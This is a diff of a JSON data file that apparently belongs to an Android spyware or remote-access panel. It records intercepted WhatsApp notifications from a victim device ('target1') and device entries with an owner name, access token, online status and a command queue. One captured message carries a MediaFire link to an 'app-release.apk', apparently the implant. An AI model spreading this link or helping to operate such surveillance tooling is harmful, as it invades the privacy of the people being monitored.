@@ -22,6 +22,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2621 pesan dari 17 chat",
+        "time": "30/04 06:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777501098913
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "target1",
         "content": "https://www.mediafire.com/file/rf40t2gsg2am208/app-release.apk/file",
         "time": "30/04 06:28",
@@ -4011,14 +4019,6 @@
         "time": "30/04 06:27",
         "pkg": "com.whatsapp",
         "receivedAt": 1777500967522
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Pegasus-X Room (7 pesan): ~ wanglin",
-        "content": "Menunggu pesan ini. Ini mungkin membutuhkan waktu beberapa saat.",
-        "time": "30/04 06:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777500967414
       }
     ],
     "galleryPhotos": [],
@@ -18141,7 +18141,7 @@
     "deviceName": "HP-ZAL7SEX-67C3",
     "ownerUsername": "Zal7Sex",
     "token": "228585cf435485e2101335e5900a661b",
-    "lastSeen": 1777501081011,
+    "lastSeen": 1777501096022,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T16:01:38.130Z",
